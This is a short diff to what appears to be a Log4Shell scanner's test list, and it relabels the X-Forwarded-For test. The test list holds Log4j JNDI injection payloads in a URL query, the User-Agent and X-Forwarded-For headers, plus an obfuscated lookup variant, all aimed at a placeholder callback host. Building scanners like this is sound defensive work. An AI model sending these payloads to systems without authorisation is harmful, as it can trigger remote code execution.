@@ -34,7 +34,7 @@ tests += [{ "path" : "/?abc=${jndi:ldap://SITESPECIFIC-urlquery-ORGANISATION.DOM
 tests += [{ "headers" : { 'User-Agent' : '${jndi:ldap://SITESPECIFIC-ua-ORGANISATION.DOMAIN/a}' } }]
 
 # X-Forwarded-For 
-tests += [{ "headers" : { 'X-Forwarded-For' : '${jndi:ldap://SITESPECIFIC-ua-ORGANISATION.DOMAIN/a}' } }]
+tests += [{ "headers" : { 'X-Forwarded-For' : '${jndi:ldap://SITESPECIFIC-xff-ORGANISATION.DOMAIN/a}' } }]
 
 # User-Agent obfuscated
 tests += [{ "headers" : { "User-Agent" : "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-obfs-ORGANISATION.DOMAIN/poc}" } }]
